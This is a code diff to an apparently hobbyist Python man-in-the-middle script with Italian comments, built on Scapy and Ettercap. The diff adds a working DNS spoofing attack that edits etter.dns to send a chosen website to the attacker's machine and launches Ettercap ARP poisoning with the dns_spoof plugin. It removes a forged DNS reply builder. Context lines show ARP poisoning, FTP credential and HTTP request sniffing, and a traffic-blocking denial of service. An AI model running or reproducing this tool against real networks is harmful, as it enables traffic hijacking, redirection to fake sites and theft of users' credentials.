@@ -9,6 +9,7 @@ import string
 import random
 import datetime
 import fileinput
+import socket
 
 #dichiarazione variabili utili
 conf.verb = 0                              #annullo i print di scapy                     
@@ -19,9 +20,12 @@ sniff_file = "traffic.pcap"                #nome del file pcap dove viene salvat
 mitm_b = 0                                 #stato del mitm
 sniff_b = 0                                #stato dello sniff
 attack_sel = 99				   #numero dell'attacco scelto dall'utente, posto di default a 99
+router_ip =""
+myIP = ""
 ettercap_file_path= "/etc/ettercap/etter.conf"		#posizione del file etter.conf da modificare
+ettercap_dns_file_path = "/etc/ettercap/etter.dns"	#posizione del file etter.dns che contiene le associazioni da fare per mettere a segno lo spoofing
+ettercap_recovery_dnsfile="etter_recovery.txt"
 
- 
 #funzione per scrivere sul content_log i dati sensibili 
 def write_info(sniffed_content):           
     with open(content_log, "a") as f:
@@ -102,7 +106,8 @@ def selection_attack():
 
 #funzione per selezionare un target tra i risultati della scansione        
 def selection(ip): 
-                             
+               
+    global myIP             
     iplist = []
     c = 0
     for x in ip.keys():
@@ -128,17 +133,16 @@ def selection(ip):
 	print "Traffic bloccked! Press ctrl+c to stop DOS!"
 
     if attack_sel == 1:
-	#nuove modifiche
-	iptables_rule = "iptables --append FORWARD --in-interface "+iface+" --source "+target_host+" --protocol udp --destination-port 53 -j DROP"
- 	os.system(iptables_rule) 
-	#ettercap_file_editor()
-	#write_info(msg)
-
+	local_gateway = router_ip
+	myIP = find_local_ip()
+	editDNS()
+	dns_spoofing(target_host, local_gateway, myIP)
+		
     return target_host, target_mac, attack_sel
 	
-
 #funzione per ottenere l'IP del router ed il MAC del router
-def get_router():                                   
+def get_router():    
+    global router_ip                               
     ip_cmd = Popen(["ip", "route"], stdout=PIPE)
     ip_data = ip_cmd.communicate()[0].split("\n")[0].split()
     router_ip = ip_data[2]
@@ -158,132 +162,15 @@ def arp_poisoning(router_ip, target_host, router_mac, target_mac):
         send(packet_dst)
         time.sleep(2)
 
-def id_generator(size = 6, chars=string.ascii_lowercase):
-	 return ''.join(random.choice(chars) for _ in range(size))
 
-#funzione che si occupa di modificare il file etter.conf di Ettercap affinche'
-#lo script funzioni per l'attacco numero 2
-def ettercap_file_editor():
-
-	print "editing etter.conf..."
-	with open(ettercap_file_conf, 'r') as file:
-		filedata = file.read()
-	
-	#apporto le modifiche al file
-	filedata = filedata.replace('ec_uid = 65534', 'ec_uid = 0')
-	filedata = filedata.replace('ec_gid = 65534', 'ec_gid = 0')
-
-	filedata = filedata.replace('#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"') 
-	filedata = filedata.replace('#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"')
-
-	# Write the file out again
-	with open(ettercap_file_conf, 'w') as file:
-  		file.write(filedata)
-	file.close()
-
-#funzione di ripristino del file etter.conf	
-def ettercap_file_recovery():
-	
-	print "recovering etter.conf"
-	with open(ettercap_file_conf, 'r') as file:
-		filedata = file.read()
-	
-	#apporto le modifiche al file
-	filedata = filedata.replace('ec_uid = 0', 'ec_uid = 65534')
-	filedata = filedata.replace('ec_gid = 0', 'ec_gid = 65534')
-
-	filedata = filedata.replace('redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"') 
-	filedata = filedata.replace('redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"')
-
-	# Write the file out again
-	with open(ettercap_file_conf, 'w') as file:
-  		file.write(filedata)
-	file.close()
-
-def build_packet (packet):
-#copia ed edit del pacchetto malevolo di risposta
-
-	fake_pkt = Ether()/IP()/UDP()/DNS()
-#Ether
-	fake_pkt.src = packet.dst	
-	fake_pkt.dst = packet.src
-
-#IP
-	fake_pkt[IP].dst = packet[IP].src
-	fake_pkt[IP].src = '192.168.1.254'
-	fake_pkt[IP].version = 4
-	fake_pkt[IP].ihl = 5
-	fake_pkt[IP].tos = '0x0'
-	fake_pkt[IP].len = 159	
-	fake_pkt[IP].frag = 0
-	fake_pkt[IP].ttl = 64
-	fake_pkt[IP].proto = 'udp'
-	fake_pkt[IP].chksum = '0xb515'
-
-#UDP
-	fake_pkt[UDP].sport = 53
-	fake_pkt[UDP].dport = packet[UDP].sport
-	fake_pkt[UDP].len = 123
-	fake_pkt[UDP].chksum = '0xb515'
-			
-#DNS
-	fake_pkt[DNS].id = packet[DNS].id
-	#fake_pkt[DNS].id = 79305
-	fake_pkt[DNS].qr = 1
-	fake_pkt[DNS].opcode = 'QUERY'
-	fake_pkt[DNS].aa = 0
-	fake_pkt[DNS].tc = 0
-	fake_pkt[DNS].rd = 1
-	fake_pkt[DNS].ra = 1
-	fake_pkt[DNS].z = 0
-	fake_pkt[DNS].ad = 0
-	fake_pkt[DNS].cd = 0
-	fake_pkt[DNS].rcode = 'ok'
-	fake_pkt[DNS].qdcount = 1
-	fake_pkt[DNS].ancount = 1
-	fake_pkt[DNS].nscount = 2
-	fake_pkt[DNS].arcount = 2
-
-	#DNS\qd
-	fake_pkt[DNS].qd = packet[DNS].qd
-	#fake_pkt[DNS].qd = DNSQR(qname='ciaone', qtype = 'A', qclass = 'IN')
-	
-	#DNS\an
-	fake_pkt[DNS].an = DNSRR(rrname=fake_pkt[DNS].qd.qname, type=1, ttl=14394,rdlen=4, rdata='192.168.1.234')
-
-	#DNS\ns
-	fake_pkt[DNS].ns = DNSRR(rrname=fake_pkt[DNS].qd.qname, type='NS', rclass = 'IN', ttl=3600,rdlen = 4, rdata='ns1.%s.com'  )/DNSRR(rrname=fake_pkt[DNS].qd.qname, type='NS', rclass = 'IN', ttl=3600, rdlen = 4, rdata='192.168.1.234')
-
-	#DNS\ar
-	fake_pkt[DNS].ar= DNSRR(rrname='ns1.es555.nameserver.eu', type='A', rclass = 'IN', ttl=3600,rdlen = 4, rdata='ns1.%s.com'  )/DNSRR(rrname='ns1.es555.nameserver.eu', type='A', rclass = 'IN', ttl=3600,rdlen = 4, rdata='ns1.%s.com'  )
-
-
-	return fake_pkt
-			
 #funzione di callback applicata a tutti i pacchetti sniffati da Scapy
 def sniff_callback(packet):
 
 #regole dello sniffer
-    #analisi dei pacchetti DNS (attacco 1)
-    if packet.haslayer(UDP) and packet.haslayer(DNS) and attack_sel == 1:
-	
-	dns_port = 53
-	print dns_port
-
-	if packet[UDP].dport == dns_port:
-		#if packet.haslayer(IP):
-			packet.show()
-			fake_pkt = build_packet(packet)
-			print 'FAKE RESPONSE:' 
-			fake_pkt.show()
-			send(fake_pkt)
-			print 'fake response sent!'
-
+    
     #analisi dei pacchetti DNS per creare la cronologia (attacco 2)[FUNZIONA CORRETTAMENTE]
-    if packet.haslayer(UDP) and packet.haslayer(DNS) and attack_sel == 2:
-
+    if packet.haslayer(UDP) and packet.haslayer(DNS) and attack_sel == 2 and packet.haslayer(IPv6):
 	dns_port = 53
-	print 'Read here the complete history...'
 	if packet[UDP].dport == dns_port:
 		website_read_url = packet[DNS].qd.qname
 		time = str(datetime.datetime.now().time())
@@ -311,8 +198,7 @@ def sniff_callback(packet):
 	ftp_port = 21   
 	#controllo se si tratta della porta ftp
 	#testato su www.ftptest.net                              
-        if packet[TCP].dport == ftp_port or packet[TCP].sport == ftp_port and attack_sel == 4:
-	    print 'attack 4'   
+        if packet[TCP].dport == ftp_port or packet[TCP].sport == ftp_port and attack_sel == 4:   
             if packet[TCP].payload:
                 ftp_packet = str(packet[TCP].payload)
                 if "USER" in ftp_packet or "PASS" in ftp_packet:
@@ -324,8 +210,7 @@ def sniff_callback(packet):
 	#analisi del traffico HTTP, lettura richieste HTTP (attacco 5) [FUNZIONA CORRETTAMENTE]
 	http_port = 80                         
 	#controllo se si tratta di traffico http
-        if packet[TCP].dport == http_port or packet[TCP].sport == http_port and attack_sel == 5 :  
-	    print 'attack 5'		
+        if packet[TCP].dport == http_port or packet[TCP].sport == http_port and attack_sel == 5 :  	
             if packet[TCP].payload:
                 http_packet = str(packet[TCP].payload)
                 if "GET" in http_packet:
@@ -342,7 +227,95 @@ def pwd_sniff(iface):
     #sniffing con Scapy, con regole annesse                  
     sniff(iface=iface, prn=sniff_callback, store=0)
 
-#funzione per fermare tutto 
+##########################
+#FUNZIONI UTILI AL DNS SPOOFING
+
+
+def ettercap_file_editor():
+
+	print "editing etter.conf..."
+	with open(ettercap_file_path, 'r') as file:
+		filedata = file.read()
+	
+	#apporto le modifiche al file
+	filedata = filedata.replace('ec_uid = 65534', 'ec_uid = 0')
+	filedata = filedata.replace('ec_gid = 65534', 'ec_gid = 0')
+
+	filedata = filedata.replace('#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"') 
+	filedata = filedata.replace('#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"')
+
+	# Write the file out again
+	with open(ettercap_file_path, 'w') as file:
+  		file.write(filedata)
+	file.close()
+
+
+#funzione di ripristino del file etter.conf	
+def ettercap_file_recovery():
+	
+	print "recovering etter.conf"
+	with open(ettercap_file_path, 'r') as file:
+		filedata = file.read()
+	
+	#apporto le modifiche al file
+	filedata = filedata.replace('ec_uid = 0', 'ec_uid = 65534')
+	filedata = filedata.replace('ec_gid = 0', 'ec_gid = 65534')
+
+	filedata = filedata.replace('redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"') 
+	filedata = filedata.replace('redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"','#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"')
+
+	# Write the file out again
+	with open(ettercap_file_path, 'w') as file:
+  		file.write(filedata)
+	file.close()
+
+def dns_spoofing(target, gateway, localIP):
+	try:
+		global target_IP
+		global local_gateway
+		global myIP
+
+		target_IP = target
+		local_gateway = gateway
+		myIP = localIP
+		os.system('service apache2 start') 
+		print 'server apache activated!'
+		#os.system("echo 0 > /proc/sys/net/ipv6/conf/eth0/use_tempaddr")
+		ettercap_file_editor()
+		#dns_file_editor()
+		
+		os.system('ettercap -T -q -i eth0 -M arp:remote -P dns_spoof //'+local_gateway+'//'+target_IP+'//') #comando // GATEWAY//IPTARGET
+    	except KeyboardInterrupt:
+        	stop()
+
+def editDNS():
+	
+	websiteUrl = raw_input("insert website to spoof, format example.org:")
+	# Write the file out again
+	with open(ettercap_dns_file_path, 'w') as file:
+  		file.write('www.'+websiteUrl+'\tA\t'+myIP+'\n')
+		file.write('*.'+websiteUrl+'\tA\t'+myIP+'\n')
+	file.close()
+
+#nella directory del progetto esiste il file originale di etter.dns che viene ripristinato
+#a fine esecuzione
+def dns_file_recovery():
+
+	src = 'recovery/etter.dns'
+	dst = '/etc/ettercap/etter.dns'
+
+	shutil.copy(src, dst)
+	print 'recovery complete!'
+
+def find_local_ip():
+	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	s.connect(("8.8.8.8", 80))
+	local_ip=(s.getsockname()[0])
+	print local_ip
+	s.close()
+	return local_ip
+
+#funzione per fermare lo script
 def stop(mitm_b, sniff_b):                            
     ip_forward_off()
     print "\nIP Forward Disabled"
@@ -355,17 +328,20 @@ def stop(mitm_b, sniff_b):
         print "Stop sniffing..."
     if attack_sel == 1:
 	ettercap_file_recovery()
-    print "Remember to read the log file to have alle the captured infos!"
+	dns_file_recovery()
+	os.system('service apache2 stop')	
+    print "Remember to read the log file to have all the captured infos!"
     exit()
 
 #funzione per avviare lo script
 def start():                                        
-    try:
-	
+    try:	
 	mitm_b = 0
 	sniff_b = 0
+
 	#pulizia del file di log
 	open(content_log, "w")
+
         ip_forward_on()                             
         print "IP Forward Enabled"
         iptables_rules()                            
@@ -385,7 +361,7 @@ def start():
         arp.start()                                 
         mitm_b = 1
 	
-	if attack_sel != 0:
+	if attack_sel != 0 and attack_sel != 1:
         	print "Attack Started..."       
 		sniff = threading.Thread(target=pwd_sniff, args=[iface])
         	sniff.setDaemon(True)
@@ -394,10 +370,6 @@ def start():
         	sniff_b = 1
         	print "Sniffing network..."
 	
-	#se il traffico e' bloccato si mostrera' un messaggio diverso	
-	else:    
-		print 'DOS in progress...'
-		
     except KeyboardInterrupt:
         stop(mitm_b, sniff_b)
         return 0, 0
